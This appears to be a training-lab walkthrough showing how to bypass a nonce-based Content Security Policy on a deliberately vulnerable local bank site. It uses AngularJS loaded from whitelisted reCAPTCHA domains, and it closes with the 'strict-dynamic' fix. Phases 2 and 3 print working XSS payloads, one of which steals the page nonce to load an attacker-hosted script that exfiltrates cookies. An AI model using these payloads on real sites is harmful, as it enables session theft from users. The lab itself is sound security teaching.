# CSP Bypass Lab - Walkthrough

Two CSP bypass techniques against a nonce-based policy that whitelists Google's
reCAPTCHA domains. The victim is a fake bank on port 8181; the attacker host
(payload reference and `evil.js`) is on port 9090.

## Start

```bash
docker compose up --build
```

- Victim:   http://localhost:8181
- Attacker: http://localhost:9090

## Phase 1 - Inspect the CSP

1. Open http://localhost:8181 and open DevTools (F12).
2. Network tab, reload, click the document request, look at the response header
   `Content-Security-Policy`:

   ```
   script-src 'nonce-<random>' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'unsafe-inline';
   default-src 'self'; img-src * data:; style-src 'self' 'unsafe-inline';
   ```

   There is a nonce but no `'strict-dynamic'`, so the whitelist still applies.
3. As a baseline, submit `<script>alert(1)</script>` in the feedback form. CSP
   blocks it and logs a violation in the console.

The page also loads reCAPTCHA, which pulls in a full AngularJS build from the
whitelisted Google path. Confirm with `!!window.angular` in the console - it
returns `true`.

## Phase 2 - Case 1: alert

The feedback form writes input to `innerHTML` and then compiles the new node with
AngularJS, so directives in injected HTML run.

Submit this as the feedback:

```html
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert("CSP BYPASSED - Simple Attack!")'>
```

The image fails to load, `ng-on-error` runs, and the alert appears. CSP did not
block it because the executing code came from AngularJS, which loaded from a
whitelisted domain.

Limits: no `eval()`/`Function()` (no `unsafe-eval`), only AngularJS expressions.

## Phase 3 - Case 2: nonce theft and cookie exfiltration

Submit this as the feedback:

```html
<img src=x ng-on-error='
    doc=$event.target.ownerDocument;
    a=doc.defaultView.top.document.querySelector("[nonce]");
    b=doc.createElement("script");
    b.src="http://localhost:9090/evil.js";
    b.nonce=a.nonce;
    doc.body.appendChild(b)
'>
```

Chain:

1. AngularJS (already loaded) evaluates the `ng-on-error` expression.
2. `querySelector('[nonce]').nonce` reads the live nonce value. DevTools shows the
   attribute as empty, but `element.nonce` returns the real value from JavaScript.
3. A new `<script>` is created, stamped with the stolen nonce, and pointed at
   `http://localhost:9090/evil.js`.
4. The browser accepts it because the nonce matches, and `evil.js` runs with full
   privileges: it reads `document.cookie`, shows a banner, and posts the data back.

## Why it works

`script-src 'nonce-X' https://trusted.com` allows scripts with the nonce *and*
scripts from `https://trusted.com`. When the trusted source serves AngularJS, an
attacker with HTML injection can run code. `'strict-dynamic'` would make the
browser ignore the whitelist and trust only nonce-carrying (and
nonce-propagated) scripts, which closes both cases.

## Fixing the victim

In `victim-site/app.py`, change `script-src` to:

```
script-src 'nonce-{nonce}' 'strict-dynamic';
```

Rebuild (`docker compose up -d --build victim`) and retry Case 2 - the injected
script is rejected. The primary fix is still to sanitize the `innerHTML` sink in
`victim-site/index.html`.

## Optional: Burp Suite

Proxy the browser through Burp (127.0.0.1:8080), intercept the feedback
submission, and edit the `feedback` value in Repeater to iterate on payloads
without retyping the form.
